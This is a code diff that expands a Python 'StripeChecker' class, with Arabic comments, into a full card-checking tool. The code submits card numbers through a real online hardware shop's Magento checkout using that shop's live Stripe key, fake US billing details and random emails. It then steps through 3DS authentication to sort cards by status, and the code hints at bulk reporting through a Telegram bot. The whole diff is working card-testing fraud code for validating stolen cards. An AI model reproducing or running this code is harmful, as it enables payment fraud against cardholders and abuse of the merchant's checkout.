@@ -177,6 +177,7 @@ stats = {
 }
 
 # ========== Stripe Checker Class ==========
+# ========== Stripe Checker Class ==========
 class StripeChecker:
     def __init__(self):
         self.session = requests.Session()
@@ -186,228 +187,404 @@ class StripeChecker:
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
         }
         
-def check(self, card_number, exp_month, exp_year, cvv, retry_count=0):
-    global CART_ID
-    
-    try:
-        # توليد بريد عشوائي
-        random_email = generate_random_email()
-        logger.info(f"📧 Using email: {random_email}")
-        logger.info(f"🔍 Checking: {card_number[:6]}****{card_number[-4:]}")
+    def check(self, card_number, exp_month, exp_year, cvv, retry_count=0):
+        global CART_ID
         
-        # الخطوة 1: إنشاء Payment Method
-        logger.info("📝 Step 1: Creating Payment Method")
-        headers = self.headers.copy()
-        headers.update({
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://js.stripe.com',
-            'referer': 'https://js.stripe.com/',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-site',
-        })
-        
-        clean_card = card_number.replace(" ", "").replace("-", "")
-        
-        data = (
-            f'billing_details[address][state]=NY&'
-            f'billing_details[address][postal_code]=10003&'
-            f'billing_details[address][country]=US&'  # ✅ تغيير من UA إلى US
-            f'billing_details[address][city]=New+York&'  # ✅ تغيير المدينة
-            f'billing_details[address][line1]=111+North+Street&'
-            f'billing_details[email]={random_email}&'
-            f'billing_details[name]=Card+Test&'
-            f'billing_details[phone]=3609998856&'
-            f'type=card&'
-            f'card[number]={clean_card}&'
-            f'card[cvc]={cvv}&'
-            f'card[exp_year]={exp_year}&'
-            f'card[exp_month]={exp_month}&'
-            f'allow_redisplay=unspecified&'
-            f'pasted_fields=number&'
-            f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
-            f'_stripe_version=2020-03-02'
-        )
-        
-        r = self.session.post(
-            'https://api.stripe.com/v1/payment_methods',
-            headers=headers,
-            data=data,
-            timeout=25
-        )
-        
-        logger.info(f"✅ PM Response: {r.status_code}")
-        
-        if r.status_code != 200:
-            logger.error(f"❌ PM Failed: {r.text[:150]}")
-            return 'DECLINED', 'Card declined by Stripe'
-        
-        pm = r.json()
-        
-        if 'id' not in pm:
-            if 'error' in pm:
-                error_msg = pm['error'].get('message', 'Card declined')
-                logger.error(f"❌ PM Error: {error_msg}")
-                return 'DECLINED', error_msg
-            return 'DECLINED', 'Invalid card'
-        
-        pm_id = pm['id']
-        logger.info(f"✅ PM Created: {pm_id}")
-        
-        # الخطوة 2: إنشاء Payment Intent عبر Magento
-        logger.info(f"📝 Step 2: Creating Payment Intent (Cart: {CART_ID[:15]}...)")
-        
-        headers = self.headers.copy()
-        headers.update({
-            'content-type': 'application/json',
-            'origin': 'https://www.ironmongeryworld.com',
-            'referer': 'https://www.ironmongeryworld.com/onestepcheckout/',
-            'x-requested-with': 'XMLHttpRequest',
-        })
-        
-        # ✅ Payload محدث مع عناوين صحيحة
-        payload = {
-            'cartId': CART_ID,
-            'billingAddress': {
-                'countryId': 'US',  # ✅ تغيير من EG إلى US
-                'region': 'New York',  # ✅ اسم الولاية كامل
-                'regionId': '43',  # ✅ إضافة Region ID
-                'regionCode': 'NY',
-                'street': ['111 North Street'],
-                'company': '',
-                'telephone': '3609998856',
-                'fax': '',
-                'postcode': '10003',
-                'city': 'New York',  # ✅ تغيير من Napoleon
-                'firstname': 'Card',
-                'lastname': 'Test',
-                'middlename': '',
-                'prefix': '',
-                'suffix': '',
-                'vatId': '',
-                'customerId': None,
-                'email': random_email,
-                'sameAsBilling': 0,
-                'customerAddressId': None,
-                'saveInAddressBook': 0,
-                'extension_attributes': {},
-            },
-            'shippingAddress': {
-                'countryId': 'US',  # ✅ تغيير من EG إلى US
-                'region': 'New York',  # ✅ اسم الولاية كامل
-                'regionId': '43',  # ✅ إضافة Region ID
-                'regionCode': 'NY',
-                'street': ['111 North Street'],
-                'company': '',
-                'telephone': '3609998856',
-                'fax': '',
-                'postcode': '10003',
-                'city': 'New York',  # ✅ تغيير من Napoleon
-                'firstname': 'Card',
-                'lastname': 'Test',
-                'middlename': '',
-                'prefix': '',
-                'suffix': '',
-                'vatId': '',
-                'customerId': None,
-                'email': random_email,
-                'sameAsBilling': 1,  # ✅ نفس عنوان الفواتير
-                'customerAddressId': None,
-                'saveInAddressBook': 0,
-                'extension_attributes': {},
-            },
-            'paymentMethod': {
-                'method': 'stripe_payments',
-                'additional_data': {
-                    'payment_method': pm_id,
-                },
-                'extension_attributes': {
-                    'agreement_ids': [],
-                },
-            },
-            'email': random_email,
-        }
-        
-        r = self.session.post(
-            f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information',
-            headers=headers,
-            json=payload,
-            timeout=25
-        )
-        
-        logger.info(f"✅ PI Response: {r.status_code}")
-        
-        # ========== التحقق من خطأ السلة ==========
-        if r.status_code not in [200, 400]:
-            error_text = r.text[:300]
-            logger.error(f"❌ PI Failed: {error_text}")
+        try:
+            # توليد بريد عشوائي
+            random_email = generate_random_email()
+            logger.info(f"📧 Using email: {random_email}")
+            logger.info(f"🔍 Checking: {card_number[:6]}****{card_number[-4:]}")
             
-            # إذا كان الخطأ متعلق بالسلة
-            if any(keyword in error_text.lower() for keyword in ['no such entity', 'not found', 'cart', 'quote']):
-                logger.warning("⚠️ Cart ID expired! Attempting to refresh...")
+            # الخطوة 1: إنشاء Payment Method
+            logger.info("📝 Step 1: Creating Payment Method")
+            headers = self.headers.copy()
+            headers.update({
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+            })
+            
+            clean_card = card_number.replace(" ", "").replace("-", "")
+            
+            data = (
+                f'billing_details[address][state]=NY&'
+                f'billing_details[address][postal_code]=10003&'
+                f'billing_details[address][country]=US&'
+                f'billing_details[address][city]=New+York&'
+                f'billing_details[address][line1]=111+North+Street&'
+                f'billing_details[email]={random_email}&'
+                f'billing_details[name]=Card+Test&'
+                f'billing_details[phone]=3609998856&'
+                f'type=card&'
+                f'card[number]={clean_card}&'
+                f'card[cvc]={cvv}&'
+                f'card[exp_year]={exp_year}&'
+                f'card[exp_month]={exp_month}&'
+                f'allow_redisplay=unspecified&'
+                f'pasted_fields=number&'
+                f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
+                f'_stripe_version=2020-03-02'
+            )
+            
+            r = self.session.post(
+                'https://api.stripe.com/v1/payment_methods',
+                headers=headers,
+                data=data,
+                timeout=25
+            )
+            
+            logger.info(f"✅ PM Response: {r.status_code}")
+            
+            if r.status_code != 200:
+                logger.error(f"❌ PM Failed: {r.text[:150]}")
+                return 'DECLINED', 'Card declined by Stripe'
+            
+            pm = r.json()
+            
+            if 'id' not in pm:
+                if 'error' in pm:
+                    error_msg = pm['error'].get('message', 'Card declined')
+                    logger.error(f"❌ PM Error: {error_msg}")
+                    return 'DECLINED', error_msg
+                return 'DECLINED', 'Invalid card'
+            
+            pm_id = pm['id']
+            logger.info(f"✅ PM Created: {pm_id}")
+            
+            # الخطوة 2: إنشاء Payment Intent عبر Magento
+            logger.info(f"📝 Step 2: Creating Payment Intent (Cart: {CART_ID[:15]}...)")
+            
+            headers = self.headers.copy()
+            headers.update({
+                'content-type': 'application/json',
+                'origin': 'https://www.ironmongeryworld.com',
+                'referer': 'https://www.ironmongeryworld.com/onestepcheckout/',
+                'x-requested-with': 'XMLHttpRequest',
+            })
+            
+            payload = {
+                'cartId': CART_ID,
+                'billingAddress': {
+                    'countryId': 'US',
+                    'region': 'New York',
+                    'regionId': '43',
+                    'regionCode': 'NY',
+                    'street': ['111 North Street'],
+                    'company': '',
+                    'telephone': '3609998856',
+                    'fax': '',
+                    'postcode': '10003',
+                    'city': 'New York',
+                    'firstname': 'Card',
+                    'lastname': 'Test',
+                    'middlename': '',
+                    'prefix': '',
+                    'suffix': '',
+                    'vatId': '',
+                    'customerId': None,
+                    'email': random_email,
+                    'sameAsBilling': 0,
+                    'customerAddressId': None,
+                    'saveInAddressBook': 0,
+                    'extension_attributes': {},
+                },
+                'shippingAddress': {
+                    'countryId': 'US',
+                    'region': 'New York',
+                    'regionId': '43',
+                    'regionCode': 'NY',
+                    'street': ['111 North Street'],
+                    'company': '',
+                    'telephone': '3609998856',
+                    'fax': '',
+                    'postcode': '10003',
+                    'city': 'New York',
+                    'firstname': 'Card',
+                    'lastname': 'Test',
+                    'middlename': '',
+                    'prefix': '',
+                    'suffix': '',
+                    'vatId': '',
+                    'customerId': None,
+                    'email': random_email,
+                    'sameAsBilling': 1,
+                    'customerAddressId': None,
+                    'saveInAddressBook': 0,
+                    'extension_attributes': {},
+                },
+                'paymentMethod': {
+                    'method': 'stripe_payments',
+                    'additional_data': {
+                        'payment_method': pm_id,
+                    },
+                    'extension_attributes': {
+                        'agreement_ids': [],
+                    },
+                },
+                'email': random_email,
+            }
+            
+            r = self.session.post(
+                f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{CART_ID}/payment-information',
+                headers=headers,
+                json=payload,
+                timeout=25
+            )
+            
+            logger.info(f"✅ PI Response: {r.status_code}")
+            
+            # ========== التحقق من خطأ السلة ==========
+            if r.status_code not in [200, 400]:
+                error_text = r.text[:300]
+                logger.error(f"❌ PI Failed: {error_text}")
                 
-                # محاولة واحدة فقط لتجديد السلة
-                if retry_count == 0:
-                    new_cart_id = get_quote_id_smart()
+                # إذا كان الخطأ متعلق بالسلة
+                if any(keyword in error_text.lower() for keyword in ['no such entity', 'not found', 'cart', 'quote']):
+                    logger.warning("⚠️ Cart ID expired! Attempting to refresh...")
                     
-                    if new_cart_id:
-                        logger.info(f"✅ تم تحديث Cart ID: {new_cart_id}")
-                        stats['cart_refreshed'] += 1
+                    if retry_count == 0:
+                        new_cart_id = get_quote_id_smart()
                         
-                        # إعادة المحاولة مع السلة الجديدة
-                        return self.check(card_number, exp_month, exp_year, cvv, retry_count=1)
+                        if new_cart_id:
+                            logger.info(f"✅ تم تحديث Cart ID: {new_cart_id}")
+                            stats['cart_refreshed'] += 1
+                            return self.check(card_number, exp_month, exp_year, cvv, retry_count=1)
+                        else:
+                            logger.error("❌ فشل تحديث السلة")
+                            return 'ERROR', '⚠️ Cart refresh failed'
                     else:
-                        logger.error("❌ فشل تحديث السلة")
-                        return 'ERROR', '⚠️ Cart refresh failed'
+                        return 'ERROR', '⚠️ Cart still invalid after refresh'
+                
+                if 'shipping address is missing' in error_text.lower():
+                    logger.error("❌ Shipping address error")
+                    if retry_count == 0:
+                        return self.check(card_number, exp_month, exp_year, cvv, retry_count=1)
+                    return 'ERROR', '⚠️ Shipping address error'
+                
+                return 'DECLINED', 'Payment processing failed'
+            
+            res = r.json()
+            
+            if 'message' not in res:
+                logger.error("❌ No message in PI response")
+                return 'DECLINED', 'Payment declined'
+            
+            message = res['message']
+            logger.info(f"📨 Message: {message[:60]}...")
+            
+            if 'pi_' not in message:
+                if 'order' in message.lower() or message.isdigit():
+                    logger.info("✅ Payment succeeded (order created)")
+                    return 'Y', f'Payment succeeded - Order: {message}'
+                return 'DECLINED', message[:100]
+            
+            # استخراج client_secret
+            if 'Authentication Required: ' in message:
+                client_secret = message.replace('Authentication Required: ', '')
+            elif ': ' in message:
+                client_secret = message.split(': ')[1]
+            else:
+                client_secret = message
+            
+            if '_secret_' not in client_secret:
+                logger.error(f"❌ Invalid client_secret: {client_secret[:50]}")
+                return 'DECLINED', 'Invalid payment intent'
+            
+            pi_id = client_secret.split('_secret_')[0]
+            logger.info(f"✅ PI Created: {pi_id}")
+            
+            # الخطوة 3: الحصول على Payment Intent Details
+            logger.info("📝 Step 3: Fetching Payment Intent")
+            
+            headers = self.headers.copy()
+            headers.update({
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+            })
+            
+            params = {
+                'is_stripe_sdk': 'false',
+                'client_secret': client_secret,
+                'key': 'pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X',
+                '_stripe_version': '2020-03-02',
+            }
+            
+            r = self.session.get(
+                f'https://api.stripe.com/v1/payment_intents/{pi_id}',
+                params=params,
+                headers=headers,
+                timeout=25
+            )
+            
+            logger.info(f"✅ Fetch PI: {r.status_code}")
+            
+            if r.status_code != 200:
+                logger.error(f"❌ Fetch failed: {r.text[:150]}")
+                return 'DECLINED', 'Cannot fetch payment intent'
+            
+            pi = r.json()
+            pi_status = pi.get('status', 'unknown')
+            logger.info(f"📊 PI Status: {pi_status}")
+            
+            # التحقق من الحالة
+            if 'next_action' not in pi:
+                if pi_status == 'succeeded':
+                    logger.info("✅ Payment succeeded without 3DS")
+                    return 'Y', 'Payment succeeded'
+                elif pi_status == 'requires_payment_method':
+                    return 'DECLINED', 'Card declined'
+                elif pi_status == 'requires_confirmation':
+                    logger.info("📝 Confirming payment intent...")
+                    
+                    data = f'payment_method={pm_id}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
+                    
+                    r = self.session.post(
+                        f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm',
+                        headers=headers,
+                        data=data,
+                        timeout=25
+                    )
+                    
+                    if r.status_code == 200:
+                        pi = r.json()
+                        pi_status = pi.get('status', 'unknown')
+                        logger.info(f"📊 After confirm: {pi_status}")
+                        
+                        if 'next_action' not in pi:
+                            if pi_status == 'succeeded':
+                                return 'Y', 'Payment succeeded'
+                            return 'DECLINED', f'Status: {pi_status}'
+                    else:
+                        logger.error(f"❌ Confirm failed: {r.status_code}")
+                        return 'DECLINED', 'Confirmation failed'
                 else:
-                    return 'ERROR', '⚠️ Cart still invalid after refresh'
+                    return 'DECLINED', f'Status: {pi_status}'
             
-            # ✅ معالجة خطأ Shipping Address
-            if 'shipping address is missing' in error_text.lower():
-                logger.error("❌ Shipping address error - retrying with updated address")
-                if retry_count == 0:
-                    return self.check(card_number, exp_month, exp_year, cvv, retry_count=1)
-                return 'ERROR', '⚠️ Shipping address error'
+            # الخطوة 4: 3DS2 Authentication
+            logger.info("📝 Step 4: 3DS Authentication")
             
-            return 'DECLINED', 'Payment processing failed'
-        
-        res = r.json()
-        
-        if 'message' not in res:
-            logger.error("❌ No message in PI response")
-            return 'DECLINED', 'Payment declined'
-        
-        message = res['message']
-        logger.info(f"📨 Message: {message[:60]}...")
-        
-        if 'pi_' not in message:
-            # قد يكون order number
-            if 'order' in message.lower() or message.isdigit():
-                logger.info("✅ Payment succeeded (order created)")
-                return 'Y', f'Payment succeeded - Order: {message}'
-            return 'DECLINED', message[:100]
-        
-        # استخراج client_secret
-        if 'Authentication Required: ' in message:
-            client_secret = message.replace('Authentication Required: ', '')
-        elif ': ' in message:
-            client_secret = message.split(': ')[1]
-        else:
-            client_secret = message
-        
-        if '_secret_' not in client_secret:
-            logger.error(f"❌ Invalid client_secret: {client_secret[:50]}")
-            return 'DECLINED', 'Invalid payment intent'
-        
-        pi_id = client_secret.split('_secret_')[0]
-        logger.info(f"✅ PI Created: {pi_id}")
-        
-        # ... باقي الكود كما هو (3DS Authentication)
-        
-    except Exception as e:
-        logger.error(f"💥 Exception: {type(e).__name__}: {str(e)[:100]}")
-        return 'ERROR', f'{type(e).__name__}: {str(e)[:50]}'
-
+            next_action = pi['next_action']
+            
+            if 'use_stripe_sdk' not in next_action:
+                logger.error("❌ No use_stripe_sdk")
+                return 'DECLINED', 'No 3DS data'
+            
+            sdk_data = next_action['use_stripe_sdk']
+            source = sdk_data.get('three_d_secure_2_source', '')
+            trans_id = sdk_data.get('server_transaction_id', '')
+            
+            if not source or not trans_id:
+                logger.error("❌ Missing 3DS params")
+                return 'DECLINED', 'Missing 3DS data'
+            
+            logger.info(f"🔐 3DS Source: {source[:30]}...")
+            
+            # إنشاء fingerprint
+            fp_data = {"threeDSServerTransID": trans_id}
+            fp = base64.b64encode(json.dumps(fp_data).encode()).decode()
+            
+            browser_data = {
+                "fingerprintAttempted": True,
+                "fingerprintData": fp,
+                "challengeWindowSize": None,
+                "threeDSCompInd": "Y",
+                "browserJavaEnabled": False,
+                "browserJavascriptEnabled": True,
+                "browserLanguage": "en",
+                "browserColorDepth": "24",
+                "browserScreenHeight": "786",
+                "browserScreenWidth": "1397",
+                "browserTZ": "-120",
+                "browserUserAgent": "Mozilla/5.0"
+            }
+            
+            browser_encoded = urllib.parse.quote(json.dumps(browser_data))
+            
+            data = (
+                f'source={source}&'
+                f'browser={browser_encoded}&'
+                f'one_click_authn_device_support[hosted]=false&'
+                f'one_click_authn_device_support[same_origin_frame]=false&'
+                f'one_click_authn_device_support[spc_eligible]=true&'
+                f'one_click_authn_device_support[webauthn_eligible]=true&'
+                f'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
+                f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
+                f'_stripe_version=2020-03-02'
+            )
+            
+            headers = self.headers.copy()
+            headers.update({
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+            })
+            
+            r = self.session.post(
+                'https://api.stripe.com/v1/3ds2/authenticate',
+                headers=headers,
+                data=data,
+                timeout=25
+            )
+            
+            logger.info(f"✅ 3DS Auth: {r.status_code}")
+            
+            if r.status_code != 200:
+                logger.error(f"❌ 3DS failed: {r.text[:150]}")
+                return 'DECLINED', '3DS auth failed'
+            
+            auth = r.json()
+            
+            # تحليل النتيجة
+            if 'ares' in auth:
+                trans_status = auth['ares'].get('transStatus', 'UNKNOWN')
+                logger.info(f"🎯 3DS Result: {trans_status}")
+                
+                status_map = {
+                    'Y': ('Y', '✅ Authenticated - Full verification'),
+                    'C': ('C', '⚠️ Challenge Required'),
+                    'A': ('A', '🔵 Attempted Authentication'),
+                    'N': ('N', '❌ Not Authenticated'),
+                    'U': ('U', '🔴 Unavailable'),
+                    'R': ('DECLINED', '❌ Rejected by issuer'),
+                }
+                
+                if trans_status in status_map:
+                    result = status_map[trans_status]
+                    logger.info(f"✅ Final: {result[0]} - {result[1]}")
+                    return result
+                else:
+                    logger.error(f"❌ Unknown status: {trans_status}")
+                    return ('DECLINED', f'Unknown: {trans_status}')
+            
+            if 'error' in auth:
+                error_msg = auth['error'].get('message', 'Unknown')
+                logger.error(f"❌ 3DS Error: {error_msg}")
+                return 'DECLINED', f'Error: {error_msg[:50]}'
+            
+            state = auth.get('state', 'unknown')
+            logger.info(f"📊 State: {state}")
+            
+            if state == 'failed':
+                return 'DECLINED', 'Authentication failed'
+            elif state == 'succeeded':
+                return 'Y', 'Authentication succeeded'
+            
+            logger.error(f"❌ Unexpected state: {state}")
+            return 'DECLINED', f'State: {state}'
+            
+        except requests.exceptions.Timeout:
+            logger.error("⏱️ Request timeout")
+            return 'ERROR', 'Timeout - try again'
+        except requests.exceptions.ConnectionError:
+            logger.error("🌐 Connection error")
+            return 'ERROR', 'Connection failed'
+        except Exception as e:
+            logger.error(f"💥 Exception: {type(e).__name__}: {str(e)[:100]}")
+            return 'ERROR', f'{type(e).__name__}: {str(e)[:50]}'
 async def send_result(bot_app, card, status_type, message):
     try:
         card_number = stats['authenticated'] + stats['challenge'] + stats['attempted']
